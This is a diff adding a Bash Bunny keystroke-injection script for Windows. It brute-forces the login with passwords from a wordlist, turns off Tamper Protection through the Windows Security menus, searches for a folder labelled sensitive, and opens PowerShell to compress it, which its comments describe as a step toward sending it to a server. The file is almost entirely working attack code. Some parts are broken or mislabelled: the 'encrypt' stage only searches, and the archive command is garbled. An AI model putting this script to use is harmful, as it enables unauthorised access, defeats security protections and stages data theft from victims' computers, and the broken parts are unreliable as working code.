@@ -1,0 +1,72 @@
+#!/bin/bash
+
+# Bash Bunny payload to brute-force Windows login with passwords from password.txt
+# Note: Automatic detection of successful login is not possible with keystroke injection alone.
+# This script tries passwords sequentially. To "exit" when found, monitor the screen and unplug the Bunny when login succeeds.
+# Alternatively, limit attempts or add manual intervention.
+
+ATTACKMODE HID
+
+# Mount storage to access loot folder
+mount /dev/nandf /root/udisk/
+
+# ATTACK ONE: Loop through each password in the file (Read from loot/password.txt)
+count=0
+sed 's/\r$//' /root/udisk/loot/password.txt | while read -r word; do
+    if [ $count -ge 5 ]; then break; fi  # Limit to first 5 attempts for testing
+    # Type the password
+    QUACK STRING "$word"
+    # Press Enter
+    QUACK ENTER
+    # Wait 2 seconds
+    sleep 2
+    count=$((count+1))
+done
+
+# wait for 5 seconds before commencing next attacks
+sleep 5
+
+# ATTACK TWO: Disable Tamper Protection in Windows 10 & 11
+LED STAGE1
+QUACK GUI s
+QUACK STRING Virus & threat protection
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 10000
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK TAB
+QUACK ENTER
+QUACK DELAY 1000
+QUACK SPACE
+QUACK DELAY 3000
+QUACK LEFT
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK ALT F4
+QUACK FN ALT F4
+
+# wait for 5 seconds before the next attacks
+sleep 5
+
+# ATTACK THREE: Look for sensitive folder and encrypt
+QUACK GUI s
+QUACK STRING sensitivefolder
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK FN ALT F4
+
+# ATTACK FOUR: zip a sensitive file and send it to a server
+QUACK GUI r
+QUACK DELAY 1000
+QUACK STRING powershell
+QUACK DELAY 1000
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING Compress-Archive -Path 
+QUACK ALT 34 C : \ U s e r s \ b r a n a n a \ D e s k t o p \ s e n s i t i v e f o l d e r QUACK ALT 34 -DestinationPath QUACK ALT 34 C : \ U s e r s \ b r a n a n a \ D e s k t o p \ s e n s i t i v e f o l d e r . z i p QUACK ALT 34
+
+#QUACK STRING Compress-Archive -Path "C:\Users\branana\Desktop\sensitivefolder" -DestinationPath "C:\Users\branana\Desktop\sensitivefolder.zip"
